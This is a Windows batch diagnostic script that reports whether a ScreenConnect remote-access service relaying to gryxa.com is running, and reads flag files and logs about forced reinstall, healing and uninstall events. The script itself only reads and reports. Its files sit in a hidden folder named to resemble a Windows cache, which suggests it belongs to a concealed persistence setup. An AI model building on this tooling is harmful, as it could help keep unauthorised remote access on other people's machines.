@echo off
rem GRYXA_DIAG_FAST BUILD 20260804D4 - under 8s; prefer live state over historic mon.log hits
setlocal EnableExtensions EnableDelayedExpansion
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "OUT=%WD%\gryxa_diag.txt"
set "FP=36e506ff016b2151"
set "SVC=ScreenConnect Client (%FP%)"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
> "%OUT%" echo ===== GRYXA DIAG FAST %DATE% %TIME% host=%COMPUTERNAME% =====

>>"%OUT%" echo --- builds ---
findstr /C:"MONVER=" "%WD%\own_mon.cmd" >>"%OUT%" 2>nul
findstr /C:"OWN_MON  BUILD" "%WD%\own_mon.cmd" >>"%OUT%" 2>nul
findstr /C:"OWN_GRYXA BUILD" "%WD%\own_gryxa.cmd" >>"%OUT%" 2>nul
findstr /C:"GRYXA_WATCH BUILD" "%WD%\gryxa_watch.cmd" >>"%OUT%" 2>nul
if exist "%WD%\fleet_channel.cfg" type "%WD%\fleet_channel.cfg" >>"%OUT%"
if exist "%WD%\version_floor.cfg" (>>"%OUT%" echo floor: & type "%WD%\version_floor.cfg" >>"%OUT%")
if exist "%WD%\observe.flag" (>>"%OUT%" echo OBSERVE=ON) else (>>"%OUT%" echo OBSERVE=off)

>>"%OUT%" echo --- SC services ---
sc query state= all | findstr /C:"SERVICE_NAME: ScreenConnect Client" >>"%OUT%" 2>nul

>>"%OUT%" echo --- gryxa query ---
sc query "%SVC%" >>"%OUT%" 2>&1

>>"%OUT%" echo --- ImagePath ---
reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath >>"%OUT%" 2>&1

>>"%OUT%" echo --- any gryxa.com ImagePath ---
for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "_FP=%%a"
  set "_FP=!_FP: =!"
  reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
  if not errorlevel 1 (
    >>"%OUT%" echo LIVE_OR_CFG_FP=!_FP!
    sc query "ScreenConnect Client (!_FP!)" | findstr /I "STATE" >>"%OUT%" 2>nul
  )
)

>>"%OUT%" echo --- flags ---
if exist "%WD%\gryxa_heal.flag" (>>"%OUT%" echo HEAL= & type "%WD%\gryxa_heal.flag" >>"%OUT%") else (>>"%OUT%" echo HEAL=absent)
if exist "%WD%\force_gryxa.new" (>>"%OUT%" echo FORCE_NEW= & type "%WD%\force_gryxa.new" >>"%OUT%") else (>>"%OUT%" echo FORCE_NEW=absent)
if exist "%WD%\force_gryxa.done" (>>"%OUT%" echo FORCE_DONE= & type "%WD%\force_gryxa.done" >>"%OUT%") else (>>"%OUT%" echo FORCE_DONE=absent)
if exist "%WD%\gryxa.cfg" (>>"%OUT%" echo CFG= & type "%WD%\gryxa.cfg" >>"%OUT%") else (>>"%OUT%" echo CFG=absent)
if exist "%WD%\drop_last_reason.txt" (>>"%OUT%" echo LAST_CAUSE= & type "%WD%\drop_last_reason.txt" >>"%OUT%") else (>>"%OUT%" echo LAST_CAUSE=absent)
if exist "%WD%\gryxa_watch.hb" (>>"%OUT%" echo WATCH_HB=present) else (>>"%OUT%" echo WATCH_HB=absent)
if exist "%WD%\own_gryxa.log.pre_observe" (>>"%OUT%" echo OLD_GRYXA_LOG=rotated_pre_observe) else (>>"%OUT%" echo OLD_GRYXA_LOG=none)
if exist "%WD%\drop_events" dir /b /o-d "%WD%\drop_events\drop_*.txt" >>"%OUT%" 2>nul

>>"%OUT%" echo --- marker checks (historic mon.log may still hit) ---
set "HIT_X=0"
set "HIT_FORCE=0"
set "HIT_HEAL=0"
set "HIT_OBS=0"
set "HIT_WATCH=0"
set "HIT_BLOCK=0"
if exist "%WD%\own_gryxa.log" findstr /I /C:"msiexec /x" /C:"preclean_gryxa" "%WD%\own_gryxa.log" >nul 2>&1 && set "HIT_X=1"
if exist "%WD%\own_mon.log" findstr /I /C:"gryxa_force_push" /C:"force_push_reinstall" "%WD%\own_mon.log" >nul 2>&1 && set "HIT_FORCE=1"
if exist "%WD%\own_mon.log" findstr /I /C:"gryxa_heal_queued" /C:"gryxa_1060_queue_heal" "%WD%\own_mon.log" >nul 2>&1 && set "HIT_HEAL=1"
if exist "%WD%\own_mon.log" findstr /I /C:"OBSERVE" "%WD%\own_mon.log" >nul 2>&1 && set "HIT_OBS=1"
if exist "%WD%\own_mon.log" findstr /I /C:"gryxa_watch" "%WD%\own_mon.log" >nul 2>&1 && set "HIT_WATCH=1"
if exist "%WD%\own_mon.log" findstr /I /C:"heal_blocked_OBSERVE" /C:"force_suppressed_OBSERVE" /C:"OBSERVE_abort" "%WD%\own_mon.log" >nul 2>&1 && set "HIT_BLOCK=1"
if exist "%WD%\own_gryxa.log" findstr /I /C:"OBSERVE_abort_no_mutate" /C:"preclean_fp_only_NO_msiexec_x" /C:"G10" "%WD%\own_gryxa.log" >nul 2>&1 && set "HIT_BLOCK=1"
>>"%OUT%" echo HIT_X=!HIT_X! HIT_FORCE=!HIT_FORCE! HIT_HEAL=!HIT_HEAL! HIT_OBS=!HIT_OBS! HIT_WATCH=!HIT_WATCH! HIT_BLOCK=!HIT_BLOCK!

rem Live state first
set "LIVE=UNKNOWN"
sc query "%SVC%" >nul 2>&1
if errorlevel 1 (
  set "LIVE=SERVICE_MISSING_1060"
) else (
  sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
  if not errorlevel 1 (
    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
    if not errorlevel 1 (set "LIVE=CURRENTLY_RUNNING") else (set "LIVE=RUNNING_NO_RELAY")
  ) else (
    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
    if not errorlevel 1 (set "LIVE=STOPPED_BUT_RELAY_OK") else (set "LIVE=STOPPED_NO_RELAY")
  )
)

rem any other gryxa.com running?
set "OTHER_UP=0"
for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "_FP=%%a"
  set "_FP=!_FP: =!"
  if /I not "!_FP!"=="%FP%" if /I not "!_FP!"=="5f6010579852e507" if /I not "!_FP!"=="f861c8140d453427" (
    sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
    if not errorlevel 1 (
      reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
      if not errorlevel 1 (
        set "OTHER_UP=1"
        set "OTHER_FP=!_FP!"
        if /I "!LIVE!"=="SERVICE_MISSING_1060" set "LIVE=OTHER_GRYXA_RUNNING"
      )
    )
  )
)

set "V=!LIVE!"
if exist "%WD%\drop_last_reason.txt" (
  set /p CAUSE=<"%WD%\drop_last_reason.txt"
  if defined CAUSE if /I not "!CAUSE!"=="" set "V=!CAUSE!"
)

rem Only blame OUR_* from CURRENT gryxa log (/x) — not historic mon force/heal under OBSERVE
if exist "%WD%\observe.flag" (
  if "!HIT_X!"=="1" set "V=OUR_GRYXA_UNINSTALL_IN_CURRENT_LOG"
  if /I "!V!"=="OUR_FORCE_REINSTALL" set "V=!LIVE!"
  if /I "!V!"=="OUR_HEAL_QUEUED" set "V=!LIVE!"
) else (
  if "!HIT_X!"=="1" set "V=OUR_GRYXA_UNINSTALL"
  if /I "!V!"=="!LIVE!" if "!HIT_FORCE!"=="1" if exist "%WD%\force_gryxa.new" findstr /C:"PUSH" "%WD%\force_gryxa.new" >nul 2>&1 && set "V=OUR_FORCE_PUSH_ACTIVE"
)

>>"%OUT%" echo LIVE=!LIVE! OTHER_UP=!OTHER_UP! OTHER_FP=!OTHER_FP!
>>"%OUT%" echo.
>>"%OUT%" echo VERDICT=!V!
>>"%OUT%" echo ===== END =====

echo HOST=%COMPUTERNAME%
echo VERDICT=!V!
echo LIVE=!LIVE!
findstr /C:"MONVER=" "%WD%\own_mon.cmd" 2>nul
findstr /C:"OWN_GRYXA BUILD" "%WD%\own_gryxa.cmd" 2>nul
if exist "%WD%\observe.flag" echo OBSERVE=ON
if exist "%WD%\drop_last_reason.txt" (
  echo CAUSE=
  type "%WD%\drop_last_reason.txt"
)
if "!OTHER_UP!"=="1" echo OTHER_GRYXA_UP=!OTHER_FP!
echo HITS x=!HIT_X! force=!HIT_FORCE! heal=!HIT_HEAL! obs=!HIT_OBS! watch=!HIT_WATCH! block=!HIT_BLOCK!
echo FILE=%OUT%
echo OK
endlocal
